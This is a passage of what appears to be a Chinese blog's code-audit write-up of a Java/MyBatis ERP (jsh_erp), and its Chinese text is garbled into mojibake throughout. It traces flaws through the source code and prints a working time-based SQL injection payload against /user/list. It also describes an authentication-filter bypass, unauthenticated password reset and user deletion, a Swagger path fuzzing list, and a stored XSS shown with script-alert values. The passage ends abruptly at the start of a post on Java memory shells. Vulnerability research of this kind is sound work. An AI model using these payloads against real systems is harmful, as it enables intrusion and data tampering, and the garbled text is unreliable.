ç”±äºç”¨çš„æ˜¯mybatisæ¡†æ¶ï¼Œæ‰€ä»¥å…¨å±€æœç´¢å…³é”®è¯$ï¼Œç„¶åæŒ‘ä¸€ä¸ªè¿›è¡ŒæŸ¥çœ‹ï¼Œè¿™é‡Œæˆ‘é€‰çš„æ˜¯UserMapperEx.xmlä¸‹é¢çš„ ä¸€çœ‹likeï¼Œå¯èƒ½å­˜åœ¨SQLæ³¨å…¥ï¼Œä¼˜å…ˆè€ƒè™‘æ—¶é—´ç›²æ³¨ ä¸ºäº†æ›´æ–¹ä¾¿åœ°è¿½è¸ªsqlè¯­å¥åœ°èµ°å‘ï¼Œæˆ‘è‡ªå·±åœ¨ideaä¸­ä¸‹äº†ä¸€ä¸ªæ’ä»¶ï¼šFree MyBatis Tool å‘ä¸ŠæŸ¥æ‰¾ï¼Œèµ°åˆ°äº†å¯¹åº”åœ°mapperæ–‡ä»¶ï¼šUserMapperEx.java ç»§ç»­å¾€ä¸Šæ‰¾ï¼Œèµ°åˆ°äº†UserService.javaæ–‡ä»¶ æŸ¥æ‰¾selectæ–¹æ³•çš„ç”¨æ³•ï¼Œèµ°åˆ°äº†UserComponent.java ç»§ç»­æŸ¥æ‰¾getUserListæ–¹æ³•çš„ç”¨æ³•ï¼Œèµ°åˆ°äº†æœ¬ç±»ä¸­çš„selectæ–¹æ³• ç»§ç»­æ‰¾selectæ–¹æ³•ï¼Œèµ°åˆ°äº†CommonQueryManager.java è¿™é‡Œä¸ºä»€ä¹ˆå¯ä»¥è°ƒç”¨åˆ°è¿™é‡Œå‘¢ï¼Ÿ UserComponentå®ç°äº†ICommonQueryæ¥å£ï¼Œæ‰€ä»¥åˆšåˆšå…¶å®æ˜¯è°ƒç”¨äº†ICommonQueryæ¥å£çš„selectæ–¹æ³•ï¼Œæˆ‘ä»¬çœ‹åˆšæ‰CommonQueryManagerçš„selectæ–¹æ³•ï¼Œé€šè¿‡apiNameè°ƒç”¨çš„containerçš„getCommonQuery è·Ÿè¿›ä¸€ä¸‹è¯¥æ–¹æ³• è¿”å›çš„æ˜¯ä¸€ä¸ªICommonQueryç±»å‹çš„å€¼ è¿™é‡Œçš„å…ˆè°ƒç”¨åˆå§‹åŒ–initæ–¹æ³•ï¼Œéå†serviceä¸‹çš„ç»„ä»¶ï¼ˆæ¯ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„componentç±»ï¼‰å‹å…¥configComponentMapä¸­ åç»­è°ƒç”¨getCommonQueryæ–¹æ³•æ ¹æ®ä¼ è¿›æ¥çš„apiNameè·å–å¯¹åº”çš„serviceç»„ä»¶ï¼ˆå…·ä½“apiNameè·Ÿå¯¹åº”çš„serviceç»„ä»¶æ˜ å°„å¦‚ä¸‹ï¼šuser-UserComponentï¼‰ å³serviceä¸‹æ¯ä¸ªæ–‡ä»¶å¤¹å¯¹åº”ä¸€ä¸ªapiNameï¼Œæ‰€ä»¥è¿™é‡Œè¦è°ƒç”¨UserComponentçš„selectæ–¹æ³•çš„è¯éœ€è¦apiNameä¸ºuser è§£é‡Šå®Œåæˆ‘ä»¬ç»§ç»­å¾€ä¸Šèµ°ï¼Œèµ°åˆ°äº†ResourceController.java çœ‹åˆ°äº†è¯¥æ–¹æ³•ï¼Œæˆ‘ä»¬ä¹Ÿå°±æ˜ç™½äº†æˆ‘ä»¬æ‰€éœ€è¦çš„è·¯ç”±æ˜¯/user/listäº†ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨è¯¥è¿‡ç¨‹ä¸­æ²¡æœ‰å¯¹ä¼ è¿›æ¥çš„å‚æ•°è¿›è¡Œä»»ä½•çš„æ£€æµ‹ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œsqlæ³¨å…¥ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨çš„æ˜¯æ—¶é—´æ³¨å…¥ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š payloadï¼š/user/list?search=%7b%22userName%22%3a%22%22%2c%22loginName%22%3a%22jsh%20and%20sleep(3)--%2b%22%7dcurrentPage=1pageSize=10 è™½ç„¶payloadä¸­å°±sleep3ç§’ï¼Œä½†æ˜¯å®é™…æµ‹è¯•çš„æ—¶å€™å…¶å®ä¸æ­¢ å†æ¥ä¸€ä¸ªå¸ƒå°”ç›²æ³¨çš„ç‚¹ï¼Œå¯å‚è€ƒæ–‡ç« ï¼šæ·±å…¥å­¦ä¹ Javaä»£ç å®¡è®¡æŠ€å·§â€”è¯¦ç»†å‰–ææŸerpæ¼æ´-å…ˆçŸ¥ç¤¾åŒºä¸­çš„sqlæ³¨å…¥ç‰‡æ®µ è¿˜æœ‰å¾ˆå¤šä¸ªç‚¹å¯ä»¥è‡ªå·±å»å°è¯• æœªæˆæƒä»»æ„è®¿é—®å…³äºé‰´æƒæ–¹é¢çš„ï¼Œæˆ‘ä»¬å°±æ˜¯è¦é‡ç‚¹çœ‹filterç›®å½•ä¸‹é¢çš„æ–‡ä»¶äº†ï¼Œåœ¨è¿™é‡Œä¹Ÿå°±æ˜¯LogCostFilter.java æ ¹æ®å¯¹initæ–¹æ³•çš„åˆ†æå¯çŸ¥ï¼ŒignoredUrlsä¸º[.cssï¼Œ.jsï¼Œ.jpgï¼Œ.pngï¼Œ.gifï¼Œ.ico]ï¼ŒallowUrlsä¸º[userloginï¼ŒuserregisterUserï¼Œv2api-docs] å…ˆçœ‹verifyæ–¹æ³• private static String regexPrefix = ^.*;private static String regexSuffix = .*$;private static boolean verify(ListString ignoredList, String url) for (String regex : ignoredList) Pattern pattern = Pattern.compile(regexPrefix + regex + regexSuffix); Matcher matcher = pattern.matcher(url); if (matcher.matches()) return true; return false; å°†ignoredUrlsä¸­çš„é€ä¸ªå…ƒç´ æ‹¼æ¥æˆæ­£åˆ™è¡¨è¾¾å¼åä¸å½“å‰urlè¿›è¡ŒåŒ¹é…ï¼ŒåŒ¹é…æˆåŠŸå³è¿”å›trueï¼Œä¾‹å¦‚ç¬¬ä¸€ä¸ªå…ƒç´ å½¢æˆçš„æ­£åˆ™è¡¨è¾¾å¼ä¸º^.*.css.*$ï¼Œå³åªè¦åŒ…å«ignoredUrlsä¸­çš„ä»»æ„ä¸€ä¸ªå…ƒç´ å³å¯åœ¨ä¸ç™»å½•çš„æƒ…å†µä¸‹è®¿é—® åœ¨ç™½åå•è¿‡æ»¤ä¸­ï¼Œåªè¦è¯·æ±‚urlä¸­ä»¥userloginã€userregisterUserã€v2api-docså¼€å¤´å³ä¸éœ€è¦ç™»é™†å³å¯è®¿é—® ç„¶åå†çœ‹doFilteræ–¹æ³• å‡ ä¸ªifåˆ¤æ–­ä¸­åˆ†åˆ«æ˜¯åªè¦è¯·æ±‚urlä¸­åŒ…å«æ‰€å†™çš„è·¯ç”±ï¼Œæˆ–è€…æ˜¯é€šè¿‡verifyæ–¹æ³•åˆ¤æ–­ï¼Œæˆ–è€…æ˜¯åªè¦ä»¥è¦æ±‚çš„è·¯å¾„å¼€å¤´å°±å¯ä»¥ è¿™ä¹ˆä¸€çœ‹ï¼Œå°±æ˜¯éå¸¸çš„å¥½ç»•è¿‡éªŒè¯ï¼Œå¯ä»¥è¿›è¡Œè·¯å¾„ç©¿è¶Šäº† ä¸‹é¢ç»™å‡ºä¸€ä¸ªä¾‹å­ ä»»æ„é‡ç½®ç”¨æˆ·å¯†ç åœ¨å‰é¢è¿›è¡Œé»‘ç›’æµ‹è¯•çš„è¿‡ç¨‹ä¸­ï¼Œåœ¨ç™»å½•ç®¡ç†å‘˜è´¦å·çš„æ—¶å€™å‘ç°å¯ä»¥é‡ç½®ä»»æ„ä¸€ä¸ªäººçš„å¯†ç ä¸ºåˆå§‹å¯†ç 123456ï¼Œé™¤äº†ç®¡ç†å‘˜æœ¬èº«ï¼Œå¹¶ä¸”ä¼ å‚çš„æ—¶å€™åªæœ‰ä¸€ä¸ªid å¥½å˜›ï¼Œæ¥æ´»äº†ï¼Œè¿™ä¸å°±å¯ä»¥å°è¯•æœªæˆæƒä»»æ„é‡ç½®äº†å˜›ã€‚idå€¼åœ¨ç°å®æƒ…å†µä¸‹å¯ä»¥ç›´æ¥åº“åº“çˆ†ç ´æ¢­å“ˆäº† æˆåŠŸï¼Œå…³äºè¯¥å…·ä½“çš„ä»£ç æµç¨‹å¯ä»¥è‡ªå·±å»è·Ÿä¸€ä¸‹ï¼Œè¿™é‡Œå°±ä¸å†™äº† sqlè¯­å¥å¦‚ä¸‹ï¼š ä»»æ„æ·»åŠ ç”¨æˆ·å¤±è´¥æƒ³è¦æ•…æŠ€é‡æ–½çš„æ—¶å€™å´å¤±è´¥äº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹å…·ä½“çš„ä»£ç å‘ç°insertçš„sqlè¯­å¥è¿›è¡Œäº†é¢„ç¼–è¯‘å¤„ç†ï¼Œå¹¶ä¸”è¿˜éœ€è¦tenantId ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œå¢åŠ çš„æ—¶å€™ï¼Œå¯¹äºè´¦å·éœ€è¦JsesssionIDï¼Œä¸ç„¶æ’å…¥çš„æ—¶å€™æ‰¾ä¸åˆ°tenant_idå¯¼è‡´æœ€åä¸çŸ¥é“æ’å…¥åˆ°å“ªé‡Œå» ä»»æ„åˆ é™¤ç”¨æˆ·ä¸€æ ·çš„é“ç† sqlæŸ¥è¯¢è¯­å¥ï¼š update id=batDeleteOrUpdateUser update jsh_user set status=#status where id in ( foreach collection=ids item=id separator=, #id /foreach )/update åˆ é™¤æˆåŠŸåæ•°æ®åº“æ•°æ®å¦‚ä¸‹ï¼š ç›¸å…³çš„sqlè¯­å¥ UPDATE jsh_user SET status = 1 WHERE id IN (132) å¦å¤–ï¼Œåœ¨ä¸ä½¿ç”¨æœªæˆæƒæ¼æ´è¿›è¡Œåˆ é™¤æ—¶ï¼Œsqlè¯­å¥ä¸­å­˜åœ¨å¯¹tenant_idå­—æ®µçš„åˆ¤æ–­ï¼Œå¦‚ä¸‹sqlè¯­å¥ UPDATE jsh_user SET status = 1 WHERE jsh_user.tenant_id = 63 AND id IN (132) ä»»æ„åˆ é™¤ä»»æ„å®¢æˆ·ä¾æ—§æ˜¯ä¸€æ ·çš„é“ç† åé¢çš„deleteTypeå­—æ®µæ˜¯å½“æç¤ºæ˜¯å¦å¼ºåˆ¶åˆ é™¤çš„æ—¶å€™éœ€è¦ç”¨åˆ°çš„ï¼Œè‡ªå·±ä¹Ÿä¸è¯¦è®²ï¼Œè‡ªå·±æµ‹ä¸€ä¸‹å°±çŸ¥é“äº† Swaggeræ³„éœ²Swaggeræ˜¯ä¸€ä¸ªè§„èŒƒå’Œå®Œæ•´çš„æ¡†æ¶ï¼Œç”¨äºç”Ÿæˆã€æè¿°ã€è°ƒç”¨å’Œå¯è§†åŒ– RESTful é£æ ¼çš„ Web æœåŠ¡ã€‚æ€»ä½“ç›®æ ‡æ˜¯ä½¿å®¢æˆ·ç«¯å’Œæ–‡ä»¶ç³»ç»Ÿä½œä¸ºæœåŠ¡å™¨ä»¥åŒæ ·çš„é€Ÿåº¦æ¥æ›´æ–°ã€‚ springé¡¹ç›®ä¸­çš„é…ç½®å‚è€ƒï¼šè§£å†³ Swagger API æœªæˆæƒè®¿é—®æ¼æ´ï¼šå®Œå–„åˆ†æä¸è§£å†³æ–¹æ¡ˆ-é˜¿é‡Œäº‘å¼€å‘è€…ç¤¾åŒº (aliyun.com) ç›¸å…³è·¯å¾„ï¼Œåœ¨å®é™…æµ‹è¯•å·¥ç¨‹ä¸­å¯ç”¨ä»¥ä¸‹å­—å…¸fuzz /api/api-docs/api-docs/swagger.json/api.html/api/api-docs/api/apidocs/api/doc/api/swagger/api/swagger-ui/api/swagger-ui.html/api/swagger-ui.html//api/swagger-ui.json/api/swagger.json/api/swagger//api/swagger/ui/api/swagger/ui//api/swaggerui/api/swaggerui//api/v1//api/v1/api-docs/api/v1/apidocs/api/v1/swagger/api/v1/swagger-ui/api/v1/swagger-ui.html/api/v1/swagger-ui.json/api/v1/swagger.json/api/v1/swagger//api/v2/api/v2/api-docs/api/v2/apidocs/api/v2/swagger/api/v2/swagger-ui/api/v2/swagger-ui.html/api/v2/swagger-ui.json/api/v2/swagger.json/api/v2/swagger//api/v3/apidocs/apidocs/swagger.json/doc.html/docs//druid/index.html/graphql/libs/swaggerui/libs/swaggerui//spring-security-oauth-resource/swagger-ui.html/spring-security-rest/api/swagger-ui.html/sw/swagger-ui.html/swagger/swagger-resources/swagger-resources/configuration/security/swagger-resources/configuration/security//swagger-resources/configuration/ui/swagger-resources/configuration/ui//swagger-ui/swagger-ui.html/swagger-ui.html#/api-memory-controller/swagger-ui.html//swagger-ui.json/swagger-ui/swagger.json/swagger.json/swagger.yml/swagger//swagger/index.html/swagger/static/index.html/swagger/swagger-ui.html/swagger/ui//Swagger/ui/index/swagger/ui/index/swagger/v1/swagger.json/swagger/v2/swagger.json/template/swagger-ui.html/user/swagger-ui.html/user/swagger-ui.html//v1.x/swagger-ui.html/v1/api-docs/v1/swagger.json/v2/api-docs/v3/api-docs ç°åœ¨çœ‹ä¸€æ‰‹å…³äºå®ƒçš„é…ç½®æ–‡ä»¶Swagger2Config.java @Configuration@EnableSwagger2public class Swagger2Config @Bean public Docket createRestApi() return new Docket(DocumentationType.SWAGGER_2) .apiInfo(this.apiInfo()) .select() .apis(RequestHandlerSelectors.any()) .paths(PathSelectors.any()) .build(); private ApiInfo apiInfo() return new ApiInfoBuilder() .title(Mybatis-Plus Plugin Example RESTful APIs) .description(é›†æˆMybatis-Plusæ¨¡å—æ¥å£æè¿°) .termsOfServiceUrl(http://127.0.0.1) .contact(new Contact(jishenghua, , )) .version(2.1.1) .build(); åœ¨è¯¥ç±»åŠé…ç½®æ–‡ä»¶ä¸­æœªè¿›è¡Œä»»ä½•çš„é™åˆ¶åŠè®¿é—®æ§åˆ¶å’Œèº«ä»½éªŒè¯ï¼Œå¦å¤–åœ¨filterä¸­ä¹Ÿæœªè¿›è¡Œèº«ä»½åˆ¤æ–­ï¼Œå› æ­¤å¯¼è‡´åœ¨æœªç™»å½•çš„æƒ…å†µä¸‹èƒ½å¤Ÿè¯·æ±‚å¾—åˆ°apiæ¥å£ ä¿®å¤ é™åˆ¶ç”Ÿæˆæ–‡æ¡£çš„è¯·æ±‚å¤„ç†ç¨‹åºï¼šä½¿ç”¨é€‚å½“çš„ RequestHandlerSelectors æ¥é€‰æ‹©åªåŒ…å«éœ€è¦å…¬å¼€çš„æ¥å£ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ RequestHandlerSelectors.any()ã€‚ é™åˆ¶ç”Ÿæˆæ–‡æ¡£çš„è·¯å¾„ï¼šä½¿ç”¨é€‚å½“çš„ PathSelectors æ¥é€‰æ‹©åªåŒ…å«éœ€è¦å…¬å¼€çš„è·¯å¾„ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ PathSelectors.any()ã€‚ æ·»åŠ è®¿é—®æ§åˆ¶å’Œèº«ä»½éªŒè¯ï¼šç¡®ä¿åªæœ‰æˆæƒç”¨æˆ·èƒ½å¤Ÿè®¿é—® Swagger API æ–‡æ¡£ã€‚è¿™å¯ä»¥é€šè¿‡é…ç½®èº«ä»½éªŒè¯å’Œæˆæƒæœºåˆ¶æ¥å®ç°ï¼Œä¾‹å¦‚åŸºäºè§’è‰²æˆ–ä»¤ç‰Œçš„è®¿é—®æ§åˆ¶ã€‚ å®šæœŸå®¡æŸ¥å’Œæ›´æ–°é…ç½®ï¼šå®šæœŸå®¡æŸ¥ Swagger API æ–‡æ¡£çš„é…ç½®ï¼Œç¡®ä¿å…¶ä¸åº”ç”¨ç¨‹åºçš„å®‰å…¨éœ€æ±‚ä¿æŒä¸€è‡´ï¼Œå¹¶ç»å¸¸æ›´æ–°ä»¥åæ˜ æœ€æ–°çš„å®‰å…¨è¦æ±‚ã€‚ è´¦å·å¯†ç æ³„éœ²è¿˜æ˜¯filteré‚£è¾¹æ²¡æœ‰å†™å¥½å¯¼è‡´å¯ä»¥ä»»æ„è®¿é—® XSSå…³é”®å­—ï¼š %=$c:outc:ifc:forEachModelAndViewModelMapModelrequest.getParameterrequest.setAttribute åœ¨jspæ–‡ä»¶ä¸­ï¼Œä½¿ç”¨c:outæ ‡ç­¾æ˜¯ç›´æ¥å¯¹ä»£ç è¿›è¡Œè¾“å‡ºè€Œä¸å½“æˆjsä»£ç æ‰§è¡Œ åœ¨ä½¿ç”¨thymeleaf æ¨¡æ¿è¿›è¡Œæ¸²æŸ“æ—¶ï¼Œæ¨¡æ¿è‡ªå¸¦æœ‰å­—ç¬¦è½¬ä¹‰çš„åŠŸèƒ½ th:text è¿›è¡Œæ–‡æœ¬æ›¿æ¢ ä¸ä¼šè§£æhtml th:utext è¿›è¡Œæ–‡æœ¬æ›¿æ¢ ä¼šè§£æhtml ä»¥ä¸‹ä¾‹å­ä¸­æ²¡æœ‰ä½¿ç”¨æ¸²æŸ“æ¨¡æ¿ï¼Œæœ€å¥½ä»å‰ç«¯ç•Œé¢å…¥æ‰‹ï¼Œå¯»æ‰¾å¯èƒ½çš„æ’å…¥ç‚¹ï¼Œç„¶åå¯¹åç«¯ä»£ç è¿›è¡Œåˆ†æ å­˜å‚¨å‹XSSä¸€èˆ¬åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼š å°†æ”»å‡»å‘é‡é€šè¿‡æŸä¸ªæ¥å£å­˜å…¥ å°†æ•°æ®åº“ä¸­çš„æ”»å‡»å‘é‡é€šè¿‡æŸä¸ªæ¥å£æ˜¾ç¤ºåœ¨é¡µé¢ä¸­ å­˜å…¥ç‚¹åˆ†æï¼š æ ¹æ®supplierupdateæ‰¾åˆ°å¯¹åº”çš„Controllerï¼Œåœ¨ResourceController.javaä¸­ @PostMapping(value = /apiName/update, produces = application/javascript, application/json)public String updateResource(@PathVariable(apiName) String apiName, @RequestParam(info) String beanJson, @RequestParam(id) Long id, HttpServletRequest request)throws Exception MapString, Object objectMap = new HashMapString, Object(); // è¿™é‡Œ int update = configResourceManager.update(apiName, beanJson, id, request); if(update 0) return returnJson(objectMap, ErpInfo.OK.name, ErpInfo.OK.code); else if(update == -1) return returnJson(objectMap, ErpInfo.TEST_USER.name, ErpInfo.TEST_USER.code); else return returnJson(objectMap, ErpInfo.ERROR.name, ErpInfo.ERROR.code); æ‰¾åˆ°å¯¹åº”çš„å¤„ç†æ–¹æ³• @Transactional(value = transactionManager, rollbackFor = Exception.class)public int update(String apiName, String beanJson, Long id, HttpServletRequest request)throws Exception if (StringUtil.isNotEmpty(apiName)) return container.getCommonQuery(apiName).update(beanJson, id, request); return 0; è¿˜æ˜¯ä¸€æ ·ï¼Œæ‰¾åˆ°SupplierComponent.javaç±»ä¸­çš„updateæ–¹æ³• @Overridepublic int update(String beanJson, Long id, HttpServletRequest request)throws Exception return supplierService.updateSupplier(beanJson, id, request); æ¥åˆ°SupplierService.javaå±‚ @Transactional(value = transactionManager, rollbackFor = Exception.class)public int updateSupplier(String beanJson, Long id, HttpServletRequest request)throws Exception Supplier supplier = JSONObject.parseObject(beanJson, Supplier.class); if(supplier.getBeginNeedPay() == null) supplier.setBeginNeedPay(BigDecimal.ZERO); if(supplier.getBeginNeedGet() == null) supplier.setBeginNeedGet(BigDecimal.ZERO); supplier.setId(id); int result=0; try // è¿™é‡Œ result=supplierMapper.updateByPrimaryKeySelective(supplier); logService.insertLog(å•†å®¶, new StringBuffer(BusinessConstants.LOG_OPERATION_TYPE_EDIT).append(supplier.getSupplier()).toString(), request); catch(Exception e) JshException.writeFail(logger, e); return result; æˆåŠŸæ‰¾åˆ°å¯¹åº”çš„Mapperï¼Œå³SupplierMapperï¼Œå¹¶ä¸”æ“ä½œidä¸ºupdateByPrimaryKeySelectiveï¼Œåœ¨ç›¸åº”çš„xmlæ–‡ä»¶ä¸­æ‰¾åˆ°æ›´æ–°çš„sqlè¯­å¥ update id=updateByPrimaryKeySelective parameterType=com.jsh.erp.datasource.entities.Supplier update jsh_supplier set if test=supplier != null supplier = #supplier,jdbcType=VARCHAR, /if if test=contacts != null contacts = #contacts,jdbcType=VARCHAR, /if if test=phoneNum != null phone_num = #phoneNum,jdbcType=VARCHAR, /if if test=email != null email = #email,jdbcType=VARCHAR, /if if test=description != null description = #description,jdbcType=VARCHAR, /if if test=isystem != null isystem = #isystem,jdbcType=TINYINT, /if if test=type != null type = #type,jdbcType=VARCHAR, /if if test=enabled != null enabled = #enabled,jdbcType=BIT, /if if test=advanceIn != null advance_in = #advanceIn,jdbcType=DECIMAL, /if if test=beginNeedGet != null begin_need_get = #beginNeedGet,jdbcType=DECIMAL, /if if test=beginNeedPay != null begin_need_pay = #beginNeedPay,jdbcType=DECIMAL, /if if test=allNeedGet != null all_need_get = #allNeedGet,jdbcType=DECIMAL, /if if test=allNeedPay != null all_need_pay = #allNeedPay,jdbcType=DECIMAL, /if if test=fax != null fax = #fax,jdbcType=VARCHAR, /if if test=telephone != null telephone = #telephone,jdbcType=VARCHAR, /if if test=address != null address = #address,jdbcType=VARCHAR, /if if test=taxNum != null tax_num = #taxNum,jdbcType=VARCHAR, /if if test=bankName != null bank_name = #bankName,jdbcType=VARCHAR, /if if test=accountNumber != null account_number = #accountNumber,jdbcType=VARCHAR, /if if test=taxRate != null tax_rate = #taxRate,jdbcType=DECIMAL, /if if test=tenantId != null tenant_id = #tenantId,jdbcType=BIGINT, /if if test=deleteFlag != null delete_flag = #deleteFlag,jdbcType=VARCHAR, /if /set where id = #id,jdbcType=BIGINT/update è¿™æ•´æ¡æ•°æ®æµå°±æ˜¯å°†æ”»å‡»å‘é‡å­˜å…¥æ•°æ®åº“çš„è¿‡ç¨‹ï¼Œä¸­é—´çš„æ–¹æ³•ä¸ºè¿›è¡Œä»»ä½•çš„è¿‡æ»¤ï¼Œfilterå±‚ä¹Ÿæ²¡æœ‰å¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ã€‚ ç°åœ¨éœ€è¦è§¦å‘xssï¼Œåªéœ€è¦å°†ç›¸å…³å‚æ•°æ˜¾ç¤ºåœ¨ç•Œé¢ä¸­å³å¯ã€‚ è¯»å–ç‚¹åˆ†æï¼š è¯»å–supplierè¿˜æœ‰å¦ä¸€ä¸ªapiï¼Œæ ¹æ®å‰ç«¯è§‚å¯Ÿå¯ä»¥çŸ¥é“ä¸ºsupplierlist åŒæ ·åœ¨ @GetMapping(value = /apiName/list)public String getList(@PathVariable(apiName) String apiName, @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize, @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage, @RequestParam(value = Constants.SEARCH, required = false) String search, HttpServletRequest request)throws Exception MapString, String parameterMap = ParamUtils.requestToMap(request); parameterMap.put(Constants.SEARCH, search); PageQueryInfo queryInfo = new PageQueryInfo(); MapString, Object objectMap = new HashMapString, Object(); if (pageSize != null pageSize = 0) pageSize = 10; String offset = ParamUtils.getPageOffset(currentPage, pageSize); if (StringUtil.isNotEmpty(offset)) parameterMap.put(Constants.OFFSET, offset); // è¿™é‡Œ List? list = configResourceManager.select(apiName, parameterMap); // ä¼šå°†æŸ¥è¯¢åˆ°çš„å‚æ•°æ”¾åœ¨mapçš„pageå‚æ•°ä¸­ objectMap.put(page, queryInfo); if (list == null) queryInfo.setRows(new ArrayListObject()); queryInfo.setTotal(BusinessConstants.DEFAULT_LIST_NULL_NUMBER); return returnJson(objectMap, æŸ¥æ‰¾ä¸åˆ°æ•°æ®, ErpInfo.OK.code); queryInfo.setRows(list); queryInfo.setTotal(configResourceManager.counts(apiName, parameterMap)); return returnJson(objectMap, ErpInfo.OK.name, ErpInfo.OK.code); å’Œä¸Šè¿°åˆ†æè¿‡ç¨‹ä¸€è‡´ï¼Œå¾—åˆ°æŸ¥è¯¢è¯­å¥ select id=selectByConditionSupplier parameterType=com.jsh.erp.datasource.entities.SupplierExample resultMap=com.jsh.erp.datasource.mappers.SupplierMapper.BaseResultMap select * FROM jsh_supplier where 1=1 if test=supplier != null and supplier like %$supplier% /if if test=type != null and type=$type /if if test=phonenum != null and phone_num like %$phonenum% /if if test=telephone != null and telephone like %$telephone% /if if test=description != null and description like %$description% /if and ifnull(delete_flag,0) !=1 order by id desc if test=offset != null and rows != null limit #offset,#rows /if/select è¿™å°†æ•°æ®åº“ä¸­çš„å…¨éƒ¨å­—æ®µç»“æœè¿”å›ï¼Œæœ€åå°è£…åœ¨jsonçš„pageå‚æ•°ä¸­ ç°åœ¨éœ€è¦å¯»æ‰¾å°†è¿™äº›ç»“æœæ¸²æŸ“åˆ°å‰ç«¯é¡µé¢çš„htmlæ–‡ä»¶ï¼Œä½¿ç”¨ajaxå¿…å®šä¼šå¯¹å“åº”çš„è·¯ç”±å‘èµ·è¯·æ±‚ï¼Œæœç´¢supplierlist åœ¨supplier.jsæ–‡ä»¶ä¸­ function showSupplierDetails(pageNo,pageSize) var supplier = $.trim($(#searchSupplier).val()); var phonenum = $.trim($(#searchPhonenum).val()); var telephone = $.trim($(#searchTelephone).val()); var description = $.trim($(#searchDesc).val()); $.ajax( type:get, url: /supplier/list, dataType: json, data: ( search: JSON.stringify( supplier: supplier, type: listType, phonenum: phonenum, telephone: telephone, description: description ), currentPage: pageNo, pageSize: pageSize ), success: function (res) if(res res.code === 200) if(res.data res.data.page) $(#tableData).datagrid(loadData, res.data.page); , //æ­¤å¤„æ·»åŠ é”™è¯¯å¤„ç† error:function() $.messager.alert(æŸ¥è¯¢æç¤º,æŸ¥è¯¢æ•°æ®åå°å¼‚å¸¸ï¼Œè¯·ç¨åå†è¯•ï¼,error); return; ); è¿™é‡Œå¯¹ç›¸åº”çš„urlå‘èµ·è¯·æ±‚ï¼Œå¹¶å°†å…¶æ¸²æŸ“è‡³idä¸ºtableDataçš„æ ‡ç­¾ä¸­ å¯»æ‰¾è°ƒç”¨showSupplierDetailsæ–¹æ³•çš„åœ°æ–¹ï¼Œä¸ä¹‹åŒ¹é…çš„æ˜¯åŒæ–‡ä»¶çš„initTableDataæ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­ï¼Œåªæ˜¾ç¤ºäº†å¦‚ä¸‹å‚æ•° columns:[[ field: id,width:35,align:center,checkbox:true, title: æ“ä½œ,field: op,align:center,width:60, formatter:function(value,rec,index) var str = ; str += img title=ç¼–è¾‘ src=/js/easyui/themes/icons/pencil.png style=cursor: pointer; onclick=editSupplier(\\ + index + \\);/nbsp;nbsp;nbsp;; if(isShowOpFun()) str += img title=åˆ é™¤ src=/js/easyui/themes/icons/edit_remove.png style=cursor: pointer; onclick=deleteSupplier(\\ + rec.id + \\);/; return str; , title: åç§°,field: supplier,width:150, title: è”ç³»äºº, field: contacts,width:50,align:center, title: æ‰‹æœºå·ç , field: telephone,width:100,align:center, title: ç”µå­é‚®ç®±,field: email,width:80,align:center, title: è”ç³»ç”µè¯, field: phoneNum,width:100,align:center, title: ä¼ çœŸ, field: fax,width:100,align:center, title: é¢„ä»˜æ¬¾,field: advanceIn,width:70,align:center, title: æœŸåˆåº”æ”¶,field: beginNeedGet,width:70,align:center, title: æœŸåˆåº”ä»˜,field: beginNeedPay,width:70,align:center, title: æœŸæœ«åº”æ”¶,field: allNeedGet,width:70,align:center, title: æœŸæœ«åº”ä»˜,field: allNeedPay,width:70,align:center, title: ç¨ç‡(%), field: taxRate,width:60,align:center, title: çŠ¶æ€,field: enabled,width:70,align:center,formatter:function(value) return value? span style=color:greenå¯ç”¨/span:span style=color:redç¦ç”¨/span; ]] å› æ­¤ï¼Œåœ¨æ’å…¥æ”»å‡»å‘é‡æ—¶ï¼Œéœ€è¦åœ¨æ˜¾ç¤ºçš„å‚æ•°ä¸­è¿›è¡Œé€‰æ‹©ï¼Œå½“ç„¶è¿˜éœ€è¦è€ƒè™‘å‰ç«¯çš„jsè¿‡æ»¤ã€‚ è°ƒç”¨initTableDataæ–¹æ³•çš„åœ°æ–¹ï¼Œåœ¨supplier.jsä¸­ //åˆå§‹åŒ–ç•Œé¢$(function() var listTitle = ; //å•æ®æ ‡é¢˜ var listType = ; //ç±»å‹ var listTypeEn = ; //è‹±æ–‡ç±»å‹ getType(); initTableData(); ininPager(); bindEvent();); è¿™ä¸ªåœ¨å¼•å…¥jsæ—¶å³ä¼šè°ƒç”¨ï¼Œå…¨å±€æœç´¢å¼•å…¥supplier.jsçš„åœ°æ–¹ åœ¨customer.htmlæ–‡ä»¶ä¸­æ‰¾åˆ°äº†idä¸ºtableDataçš„table table id=tableData style=top:300px;border-bottom-color:#FFFFFF/table æ•´ä¸ªæµç¨‹åˆ°è¿™é‡Œç»“æŸ æµ‹è¯• è§¦å‘ç•Œé¢ æŠ“åŒ… åå°æ‰§è¡Œçš„SQLè¯­å¥ UPDATE jsh_supplier SET supplier = å®¢æˆ·1, contacts = å°æ, phone_num = 12345678, email = , description = scriptalert(\\desc\\)/script, type = å®¢æˆ·, enabled = 1, begin_need_get = 0, begin_need_pay = 0, all_need_get = 80, fax = , telephone = , address = scriptalert(\\address\\)/script, tax_num = , bank_name = , account_number = , tax_rate = 12 WHERE jsh_supplier.tenant_id = 63 AND id = 58 åˆ·æ–°ç•Œé¢è§¦å‘XSSå¼¹çª— è¿˜æœ‰å¾ˆå¤šå…¶ä»–ç‚¹å°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†","categories":["ä»£ç å®¡è®¡"]},{"title":"javaå†…å­˜é©¬ä¹‹java-agent","path":"/2025/05/21/javaå†…å­˜é©¬ä¹‹java-agent/","content":"å‚è€ƒJavaå†…å­˜é©¬Java-Agentç¯‡ æ¦‚å¿µä¸€ä¸ªè¿è¡Œä¸­çš„ Java ç¨‹åºè¿è¡Œåœ¨ä¸€ä¸ª 